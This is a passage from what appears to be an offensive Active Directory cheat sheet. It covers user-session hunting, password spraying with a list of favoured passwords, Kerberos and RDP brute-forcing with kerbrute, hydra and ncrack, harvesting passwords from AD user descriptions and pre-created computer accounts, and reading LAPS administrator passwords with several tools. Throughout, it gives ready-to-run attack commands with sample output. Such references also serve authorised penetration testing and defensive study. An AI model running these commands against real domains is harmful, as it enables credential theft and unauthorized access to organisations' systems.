<p>The password retrieval is already handled by <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">SecureAuthCorp/secretsdump.py</a> and mimikatz, it will be displayed as CLEARTEXT. </p>
<h2 id="user-hunting">User Hunting</h2>
<p>Sometimes you need to find a machine where a specific user is logged in.  <br />
You can remotely query every machines on the network to get a list of the users's sessions.</p>
<ul>
<li>CrackMapExec
  <div class="highlight"><pre><span></span><code><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a><span class="n">cme</span> <span class="n">smb</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">/</span><span class="n">24</span> <span class="n">-u</span> <span class="n">Administrator</span> <span class="n">-p</span> <span class="s1">&#39;P@ssw0rd&#39;</span> <span class="p">-</span><span class="n">-sessions</span>
<a id="__codelineno-108-2" name="__codelineno-108-2" href="#__codelineno-108-2"></a><span class="n">SMB</span>         <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>    <span class="n">445</span>    <span class="n">WIN</span><span class="p">-</span><span class="n">8OJFTLMU1IG</span>  <span class="p">[+]</span> <span class="n">Enumerated</span> <span class="n">sessions</span>
<a id="__codelineno-108-3" name="__codelineno-108-3" href="#__codelineno-108-3"></a><span class="n">SMB</span>         <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>    <span class="n">445</span>    <span class="n">WIN</span><span class="p">-</span><span class="n">8OJFTLMU1IG</span>  <span class="p">\\</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>            <span class="n">User</span><span class="p">:</span><span class="n">Administrator</span>
</code></pre></div></li>
<li>Impacket Smbclient
  <div class="highlight"><pre><span></span><code><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a><span class="p">$</span> <span class="n">impacket-smbclient</span> <span class="n">Administrator</span><span class="nv">@10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
<a id="__codelineno-109-2" name="__codelineno-109-2" href="#__codelineno-109-2"></a><span class="c"># who</span>
<a id="__codelineno-109-3" name="__codelineno-109-3" href="#__codelineno-109-3"></a><span class="n">host</span><span class="p">:</span>  <span class="p">\\</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">,</span> <span class="n">user</span><span class="p">:</span> <span class="n">Administrator</span><span class="p">,</span> <span class="n">active</span><span class="p">:</span>     <span class="n">1</span><span class="p">,</span> <span class="n">idle</span><span class="p">:</span>     <span class="n">0</span>
</code></pre></div></li>
<li>PowerView Invoke-UserHunter
  <div class="highlight"><pre><span></span><code><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a><span class="c"># Find computers were a Domain Admin OR a specified user has a session</span>
<a id="__codelineno-110-2" name="__codelineno-110-2" href="#__codelineno-110-2"></a><span class="nb">Invoke-UserHunter</span>
<a id="__codelineno-110-3" name="__codelineno-110-3" href="#__codelineno-110-3"></a><span class="nb">Invoke-UserHunter</span> <span class="n">-GroupName</span> <span class="s2">&quot;RDPUsers&quot;</span>
<a id="__codelineno-110-4" name="__codelineno-110-4" href="#__codelineno-110-4"></a><span class="nb">Invoke-UserHunter</span> <span class="n">-Stealth</span>
</code></pre></div></li>
</ul>
<h2 id="password-spraying">Password spraying</h2>
<p>Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. </p>
<blockquote>
<p>The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates. </p>
</blockquote>
<p>Most of the time the best passwords to spray are :</p>
<ul>
<li><code>P@ssw0rd01</code>, <code>Password123</code>, <code>Password1</code>, <code>Hello123</code>, <code>mimikatz</code></li>
<li><code>Welcome1</code>/<code>Welcome01</code></li>
<li>$Companyname1 :<code>$Microsoft1</code></li>
<li>SeasonYear : <code>Winter2019*</code>, <code>Spring2020!</code>, <code>Summer2018?</code>, <code>Summer2020</code>, <code>July2020!</code></li>
<li>Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#)</li>
<li>Empty Password (Hash:31d6cfe0d16ae931b73c59d7e0c089c0)</li>
</ul>
<h3 id="kerberos-pre-auth-bruteforcing">Kerberos pre-auth bruteforcing</h3>
<p>Using <code>kerbrute</code>, a tool to perform Kerberos pre-auth bruteforcing.</p>
<blockquote>
<p>Kerberos pre-authentication errors are not logged in Active Directory with a normal <strong>Logon failure event (4625)</strong>, but rather with specific logs to <strong>Kerberos pre-authentication failure (4771)</strong>.</p>
</blockquote>
<ul>
<li>Username bruteforce
  <div class="highlight"><pre><span></span><code><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a><span class="n">root</span><span class="nv">@kali</span><span class="p">:~$</span> <span class="p">./</span><span class="n">kerbrute_linux_amd64</span> <span class="n">userenum</span> <span class="n">-d</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-dc</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">usernames</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div></li>
<li>Password bruteforce
  <div class="highlight"><pre><span></span><code><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a><span class="n">root</span><span class="nv">@kali</span><span class="p">:~$</span> <span class="p">./</span><span class="n">kerbrute_linux_amd64</span> <span class="n">bruteuser</span> <span class="n">-d</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-dc</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="n">username</span>
</code></pre></div></li>
<li>Password spray
  <div class="highlight"><pre><span></span><code><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a><span class="n">root</span><span class="nv">@kali</span><span class="p">:~$</span> <span class="p">./</span><span class="n">kerbrute_linux_amd64</span> <span class="n">passwordspray</span> <span class="n">-d</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-dc</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">domain_users</span><span class="p">.</span><span class="n">txt</span> <span class="n">Password123</span>
<a id="__codelineno-113-2" name="__codelineno-113-2" href="#__codelineno-113-2"></a><span class="n">root</span><span class="nv">@kali</span><span class="p">:~$</span> <span class="p">./</span><span class="n">kerbrute_linux_amd64</span> <span class="n">passwordspray</span> <span class="n">-d</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-dc</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">domain_users</span><span class="p">.</span><span class="n">txt</span> <span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-113-3" name="__codelineno-113-3" href="#__codelineno-113-3"></a><span class="n">root</span><span class="nv">@kali</span><span class="p">:~$</span> <span class="p">./</span><span class="n">kerbrute_linux_amd64</span> <span class="n">passwordspray</span> <span class="n">-d</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-dc</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">domain_users</span><span class="p">.</span><span class="n">txt</span> <span class="s1">&#39;123456&#39;</span> <span class="n">-v</span> <span class="p">-</span><span class="n">-delay</span> <span class="n">100</span> <span class="n">-o</span> <span class="n">kerbrute-passwordspray</span><span class="p">-</span><span class="n">123456</span><span class="p">.</span><span class="n">log</span>
</code></pre></div></li>
</ul>
<h3 id="spray-a-pre-generated-passwords-list">Spray a pre-generated passwords list</h3>
<ul>
<li>Using <code>crackmapexec</code> and <code>mp64</code> to generate passwords and spray them against SMB services on the network.
  <div class="highlight"><pre><span></span><code><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">/</span><span class="n">24</span> <span class="n">-u</span> <span class="n">Administrator</span> <span class="n">-p</span> <span class="p">`(./</span><span class="n">mp64</span><span class="p">.</span><span class="n">bin</span> <span class="n">Pass</span><span class="nv">@wor</span><span class="k">?</span><span class="n">l</span><span class="k">?</span><span class="n">a</span><span class="p">)`</span>
</code></pre></div></li>
<li>Using <code>DomainPasswordSpray</code> to spray a password against all users of a domain.
  <div class="highlight"><pre><span></span><code><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a><span class="c"># https://github.com/dafthack/DomainPasswordSpray</span>
<a id="__codelineno-115-2" name="__codelineno-115-2" href="#__codelineno-115-2"></a><span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-Password</span> <span class="n">Summer2021</span><span class="p">!</span>
<a id="__codelineno-115-3" name="__codelineno-115-3" href="#__codelineno-115-3"></a><span class="c"># /!\ be careful with the account lockout !</span>
<a id="__codelineno-115-4" name="__codelineno-115-4" href="#__codelineno-115-4"></a><span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-UserList</span> <span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Domain</span> <span class="n">domain-name</span> <span class="n">-PasswordList</span> <span class="n">passlist</span><span class="p">.</span><span class="n">txt</span> <span class="n">-OutFile</span> <span class="n">sprayed-creds</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div></li>
<li>Using <code>SMBAutoBrute</code>.
  <div class="highlight"><pre><span></span><code><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a><span class="nb">Invoke-SMBAutoBrute</span> <span class="n">-UserList</span> <span class="s2">&quot;C:\ProgramData\admins.txt&quot;</span> <span class="n">-PasswordList</span> <span class="s2">&quot;Password1, Welcome1, 1qazXDR%+&quot;</span> <span class="n">-LockoutThreshold</span> <span class="n">5</span> <span class="n">-ShowVerbose</span>
</code></pre></div></li>
</ul>
<h3 id="spray-passwords-against-the-rdp-service">Spray passwords against the RDP service</h3>
<ul>
<li>Using <a href="https://github.com/xFreed0m/RDPassSpray">RDPassSpray</a> to target RDP services.
  <div class="highlight"><pre><span></span><code><a id="__codelineno-117-1" name="__codelineno-117-1" href="#__codelineno-117-1"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">xFreed0m</span><span class="p">/</span><span class="n">RDPassSpray</span>
<a id="__codelineno-117-2" name="__codelineno-117-2" href="#__codelineno-117-2"></a><span class="n">python3</span> <span class="n">RDPassSpray</span><span class="p">.</span><span class="n">py</span> <span class="n">-u</span> <span class="no">[USERNAME]</span> <span class="n">-p</span> <span class="no">[PASSWORD]</span> <span class="n">-d</span> <span class="no">[DOMAIN]</span> <span class="n">-t</span> <span class="no">[TARGET IP]</span>
</code></pre></div></li>
<li>Using <a href="https://github.com/vanhauser-thc/thc-hydra">hydra</a> and <a href="https://github.com/nmap/ncrack">ncrack</a> to target RDP services.
  <div class="highlight"><pre><span></span><code><a id="__codelineno-118-1" name="__codelineno-118-1" href="#__codelineno-118-1"></a><span class="n">hydra</span> <span class="n">-t</span> <span class="n">1</span> <span class="n">-V</span> <span class="o">-f</span> <span class="n">-l</span> <span class="n">administrator</span> <span class="n">-P</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="n">rdp</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
<a id="__codelineno-118-2" name="__codelineno-118-2" href="#__codelineno-118-2"></a><span class="n">ncrack</span> <span class="err">–</span><span class="n">connection-limit</span> <span class="n">1</span> <span class="n">-vv</span> <span class="p">-</span><span class="n">-user</span> <span class="n">administrator</span> <span class="n">-P</span> <span class="n">password</span><span class="o">-file</span><span class="p">.</span><span class="n">txt</span> <span class="n">rdp</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
</code></pre></div></li>
</ul>
<h3 id="badpwdcount-attribute">BadPwdCount attribute</h3>
<blockquote>
<p>The number of times the user tried to log on to the account using an incorrect password. A value of 0 indicates that the value is unknown.</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-119-1" name="__codelineno-119-1" href="#__codelineno-119-1"></a><span class="p">$</span> <span class="n">crackmapexec</span> <span class="n">ldap</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">11</span> <span class="n">-u</span> <span class="s1">&#39;username&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="p">-</span><span class="n">-kdcHost</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">11</span> <span class="p">-</span><span class="n">-users</span>
<a id="__codelineno-119-2" name="__codelineno-119-2" href="#__codelineno-119-2"></a><span class="n">LDAP</span>        <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">11</span>       <span class="n">389</span>    <span class="n">dc01</span>       <span class="n">Guest</span>      <span class="n">badpwdcount</span><span class="p">:</span> <span class="n">0</span> <span class="n">pwdLastSet</span><span class="p">:</span> <span class="p">&lt;</span><span class="n">never</span><span class="p">&gt;</span>
<a id="__codelineno-119-3" name="__codelineno-119-3" href="#__codelineno-119-3"></a><span class="n">LDAP</span>        <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">11</span>       <span class="n">389</span>    <span class="n">dc01</span>       <span class="n">krbtgt</span>     <span class="n">badpwdcount</span><span class="p">:</span> <span class="n">0</span> <span class="n">pwdLastSet</span><span class="p">:</span> <span class="p">&lt;</span><span class="n">never</span><span class="p">&gt;</span>
</code></pre></div>
<h2 id="password-in-ad-user-comment">Password in AD User comment</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-120-1" name="__codelineno-120-1" href="#__codelineno-120-1"></a><span class="p">$</span> <span class="n">crackmapexec</span> <span class="n">ldap</span> <span class="n">domain</span><span class="p">.</span><span class="n">lab</span> <span class="n">-u</span> <span class="s1">&#39;username&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="n">-M</span> <span class="n">user-desc</span>
<a id="__codelineno-120-2" name="__codelineno-120-2" href="#__codelineno-120-2"></a><span class="p">$</span> <span class="n">crackmapexec</span> <span class="n">ldap</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">11</span> <span class="n">-u</span> <span class="s1">&#39;username&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="p">-</span><span class="n">-kdcHost</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">11</span> <span class="n">-M</span> <span class="nb">get-desc</span><span class="n">-users</span>
<a id="__codelineno-120-3" name="__codelineno-120-3" href="#__codelineno-120-3"></a><span class="nb">GET-DESC</span><span class="p">...</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">11</span>       <span class="n">389</span>    <span class="n">dc01</span>    <span class="p">[+]</span> <span class="n">Found</span> <span class="n">following</span> <span class="n">users</span><span class="p">:</span> 
<a id="__codelineno-120-4" name="__codelineno-120-4" href="#__codelineno-120-4"></a><span class="nb">GET-DESC</span><span class="p">...</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">11</span>       <span class="n">389</span>    <span class="n">dc01</span>    <span class="n">User</span><span class="p">:</span> <span class="n">Guest</span> <span class="n">description</span><span class="p">:</span> <span class="n">Built-in</span> <span class="n">account</span> <span class="k">for</span> <span class="n">guest</span> <span class="n">access</span> <span class="n">to</span> <span class="n">the</span> <span class="n">computer</span><span class="p">/</span><span class="n">domain</span>
<a id="__codelineno-120-5" name="__codelineno-120-5" href="#__codelineno-120-5"></a><span class="nb">GET-DESC</span><span class="p">...</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">11</span>       <span class="n">389</span>    <span class="n">dc01</span>    <span class="n">User</span><span class="p">:</span> <span class="n">krbtgt</span> <span class="n">description</span><span class="p">:</span> <span class="n">Key</span> <span class="n">Distribution</span> <span class="n">Center</span> <span class="n">Service</span> <span class="n">Account</span>
</code></pre></div>
<p>There are 3-4 fields that seem to be common in most AD schemas: <code>UserPassword</code>, <code>UnixUserPassword</code>, <code>unicodePwd</code> and <code>msSFU30Password</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-121-1" name="__codelineno-121-1" href="#__codelineno-121-1"></a><span class="n">enum4linux</span> <span class="p">|</span> <span class="n">grep</span> <span class="n">-i</span> <span class="n">desc</span>
<a id="__codelineno-121-2" name="__codelineno-121-2" href="#__codelineno-121-2"></a>
<a id="__codelineno-121-3" name="__codelineno-121-3" href="#__codelineno-121-3"></a><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_UserAccount</span> <span class="n">-Filter</span> <span class="s2">&quot;Domain=&#39;COMPANYDOMAIN&#39; AND Disabled=&#39;False&#39;&quot;</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span> <span class="n">Domain</span><span class="p">,</span> <span class="n">Status</span><span class="p">,</span> <span class="n">LocalAccount</span><span class="p">,</span> <span class="n">AccountType</span><span class="p">,</span> <span class="n">Lockout</span><span class="p">,</span> <span class="n">PasswordRequired</span><span class="p">,</span><span class="n">PasswordChangeable</span><span class="p">,</span> <span class="n">Description</span><span class="p">,</span> <span class="n">SID</span>
</code></pre></div>
<p>or dump the Active Directory and <code>grep</code> the content.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-122-1" name="__codelineno-122-1" href="#__codelineno-122-1"></a><span class="n">ldapdomaindump</span> <span class="n">-u</span> <span class="s1">&#39;DOMAIN\john&#39;</span> <span class="n">-p</span> <span class="n">MyP</span><span class="nv">@ssW0rd</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-o</span> <span class="p">~/</span><span class="n">Documents</span><span class="p">/</span><span class="n">AD_DUMP</span><span class="p">/</span>
</code></pre></div>
<h2 id="password-of-pre-created-computer-account">Password of Pre-Created Computer Account</h2>
<p>When <code>Assign this computer account as a pre-Windows 2000 computer</code> checkmark is checked, the password for the computer account becomes the same as the computer account in lowercase. For instance, the computer account <strong>SERVERDEMO$</strong> would have the password <strong>serverdemo</strong>. </p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-123-1" name="__codelineno-123-1" href="#__codelineno-123-1"></a><span class="c"># Create a machine with default password</span>
<a id="__codelineno-123-2" name="__codelineno-123-2" href="#__codelineno-123-2"></a><span class="c"># must be run from a domain joined device connected to the domain</span>
<a id="__codelineno-123-3" name="__codelineno-123-3" href="#__codelineno-123-3"></a><span class="n">djoin</span> <span class="p">/</span><span class="n">PROVISION</span> <span class="p">/</span><span class="n">DOMAIN</span> <span class="p">&lt;</span><span class="n">fqdn</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">MACHINE</span> <span class="n">evilpc</span> <span class="p">/</span><span class="n">SAVEFILE</span> <span class="n">C</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">evilpc</span><span class="p">.</span><span class="n">txt</span> <span class="p">/</span><span class="n">DEFPWD</span> <span class="p">/</span><span class="n">PRINTBLOB</span> <span class="p">/</span><span class="n">NETBIOS</span> <span class="n">evilpc</span>
</code></pre></div>
<ul>
<li>When you attempt to login using the credential you should have the following error code : <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code>.</li>
<li>Then you need to change the password with <a href="https://github.com/SecureAuthCorp/impacket/pull/1304">rpcchangepwd.py</a></li>
</ul>
<h2 id="reading-laps-password">Reading LAPS Password</h2>
<blockquote>
<p>Use LAPS to automatically manage local administrator passwords on domain joined computers so that passwords are unique on each managed computer, randomly generated, and securely stored in Active Directory infrastructure. </p>
</blockquote>
<h3 id="determine-if-laps-is-installed">Determine if LAPS is installed</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-124-1" name="__codelineno-124-1" href="#__codelineno-124-1"></a><span class="nb">Get-ChildItem</span> <span class="s1">&#39;c:\program files\LAPS\CSE\Admpwd.dll&#39;</span>
<a id="__codelineno-124-2" name="__codelineno-124-2" href="#__codelineno-124-2"></a><span class="nb">Get-FileHash</span> <span class="s1">&#39;c:\program files\LAPS\CSE\Admpwd.dll&#39;</span>
<a id="__codelineno-124-3" name="__codelineno-124-3" href="#__codelineno-124-3"></a><span class="nb">Get-AuthenticodeSignature</span> <span class="s1">&#39;c:\program files\LAPS\CSE\Admpwd.dll&#39;</span>
</code></pre></div>
<h3 id="extract-laps-password">Extract LAPS password</h3>
<blockquote>
<p>The "ms-mcs-AdmPwd" a "confidential" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users</p>
</blockquote>
<ul>
<li>
<p>From Windows:</p>
</li>
<li>
<p>adsisearcher (native binary on Windows 8+)
       <div class="highlight"><pre><span></span><code><a id="__codelineno-125-1" name="__codelineno-125-1" href="#__codelineno-125-1"></a><span class="p">(</span><span class="no">[adsisearcher]</span><span class="s2">&quot;(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))&quot;</span><span class="p">).</span><span class="n">findAll</span><span class="p">()</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">properties</span><span class="p">}</span>
<a id="__codelineno-125-2" name="__codelineno-125-2" href="#__codelineno-125-2"></a><span class="p">(</span><span class="no">[adsisearcher]</span><span class="s2">&quot;(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))&quot;</span><span class="p">).</span><span class="n">findAll</span><span class="p">()</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">properties</span><span class="p">}</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/PowerShellEmpire/PowerTools">PowerView</a>
       <div class="highlight"><pre><span></span><code><a id="__codelineno-126-1" name="__codelineno-126-1" href="#__codelineno-126-1"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-126-2" name="__codelineno-126-2" href="#__codelineno-126-2"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Get-DomainComputer</span> <span class="n">COMPUTER</span> <span class="n">-Properties</span> <span class="n">ms-mcs-AdmPwd</span><span class="p">,</span><span class="n">ComputerName</span><span class="p">,</span><span class="n">ms-mcs-AdmPwdExpirationTime</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/leoloobeek/LAPSToolkit">LAPSToolkit</a>
       <div class="highlight"><pre><span></span><code><a id="__codelineno-127-1" name="__codelineno-127-1" href="#__codelineno-127-1"></a><span class="p">$</span> <span class="nb">Get-LAPSComputers</span>
<a id="__codelineno-127-2" name="__codelineno-127-2" href="#__codelineno-127-2"></a><span class="n">ComputerName</span>                <span class="n">Password</span>                                 <span class="n">Expiration</span>         
<a id="__codelineno-127-3" name="__codelineno-127-3" href="#__codelineno-127-3"></a><span class="p">------------</span>                <span class="p">--------</span>                                 <span class="p">----------</span>         
<a id="__codelineno-127-4" name="__codelineno-127-4" href="#__codelineno-127-4"></a><span class="n">example</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span>        <span class="n">dbZu7</span><span class="p">;</span><span class="n">vGaI</span><span class="p">)</span><span class="n">Y6w1L</span>                         <span class="n">02</span><span class="p">/</span><span class="n">21</span><span class="p">/</span><span class="n">2021</span> <span class="n">22</span><span class="p">:</span><span class="n">29</span><span class="p">:</span><span class="n">18</span>
<a id="__codelineno-127-5" name="__codelineno-127-5" href="#__codelineno-127-5"></a>
<a id="__codelineno-127-6" name="__codelineno-127-6" href="#__codelineno-127-6"></a><span class="p">$</span> <span class="nb">Find-LAPSDelegatedGroups</span>
<a id="__codelineno-127-7" name="__codelineno-127-7" href="#__codelineno-127-7"></a><span class="p">$</span> <span class="nb">Find-AdmPwdExtendedRights</span>
</code></pre></div></p>
</li>
<li>
<p>Powershell AdmPwd.PS
       <div class="highlight"><pre><span></span><code><a id="__codelineno-128-1" name="__codelineno-128-1" href="#__codelineno-128-1"></a><span class="k">foreach</span> <span class="p">(</span><span class="nv">$objResult</span> <span class="k">in</span> <span class="nv">$colResults</span><span class="p">){</span><span class="nv">$objComputer</span> <span class="p">=</span> <span class="nv">$objResult</span><span class="p">.</span><span class="n">Properties</span><span class="p">;</span> <span class="nv">$objComputer</span><span class="p">.</span><span class="n">name</span><span class="p">|</span><span class="nb">where </span><span class="p">{</span><span class="nv">$objcomputer</span><span class="p">.</span><span class="n">name</span> <span class="o">-ne</span> <span class="nv">$env:computername</span><span class="p">}|%{</span><span class="k">foreach</span><span class="n">-object</span> <span class="p">{</span><span class="nb">Get-AdmPwdPassword</span> <span class="n">-ComputerName</span> <span class="nv">$_</span><span class="p">}}}</span>
</code></pre></div></p>
</li>
<li>
<p>From Linux:</p>
</li>
<li>
<p><a href="https://github.com/p0dalirius/pyLAPS">pyLAPS</a> to <strong>read</strong> and <strong>write</strong> LAPS passwords:
       <div class="highlight"><pre><span></span><code><a id="__codelineno-129-1" name="__codelineno-129-1" href="#__codelineno-129-1"></a><span class="c1"># Read the password of all computers</span>
<a id="__codelineno-129-2" name="__codelineno-129-2" href="#__codelineno-129-2"></a>./pyLAPS.py<span class="w"> </span>--action<span class="w"> </span>get<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;Administrator&#39;</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;LAB.local&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Admin123!&#39;</span><span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">192</span>.168.2.1
<a id="__codelineno-129-3" name="__codelineno-129-3" href="#__codelineno-129-3"></a><span class="c1"># Write a random password to a specific computer</span>
<a id="__codelineno-129-4" name="__codelineno-129-4" href="#__codelineno-129-4"></a>./pyLAPS.py<span class="w"> </span>--action<span class="w"> </span><span class="nb">set</span><span class="w"> </span>--computer<span class="w"> </span><span class="s1">&#39;PC01$&#39;</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;Administrator&#39;</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;LAB.local&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Admin123!&#39;</span><span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">192</span>.168.2.1
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a>:
       <div class="highlight"><pre><span></span><code><a id="__codelineno-130-1" name="__codelineno-130-1" href="#__codelineno-130-1"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;8846f7eaee8fb117ad06bdd830b7586c&#39;</span><span class="w"> </span>-M<span class="w"> </span>laps
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/n00py/LAPSDumper">LAPSDumper</a> 
       <div class="highlight"><pre><span></span><code><a id="__codelineno-131-1" name="__codelineno-131-1" href="#__codelineno-131-1"></a>python<span class="w"> </span>laps.py<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;password&#39;</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;domain.local&#39;</span>
<a id="__codelineno-131-2" name="__codelineno-131-2" href="#__codelineno-131-2"></a>python<span class="w"> </span>laps.py<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c&#39;</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;domain.local&#39;</span><span class="w"> </span>-l<span class="w"> </span><span class="s1">&#39;dc01.domain.local&#39;</span>
</code></pre></div></p>
</li>
<li>
<p>ldapsearch
